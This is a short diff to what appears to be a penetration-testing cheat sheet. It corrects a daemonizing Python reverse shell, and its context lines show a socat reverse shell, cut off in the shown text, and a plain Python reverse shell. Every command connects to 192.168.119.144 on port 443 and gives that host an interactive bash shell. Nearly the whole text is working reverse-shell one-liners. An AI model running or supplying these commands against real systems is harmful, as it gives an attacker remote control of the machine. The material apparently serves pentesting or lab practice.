@@ -1773,7 +1773,7 @@ socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144
 python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 
 # daemonizing shell for *nix hosts
-python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid()os.fork() and sys.exit();s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.socket();s.connect(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 
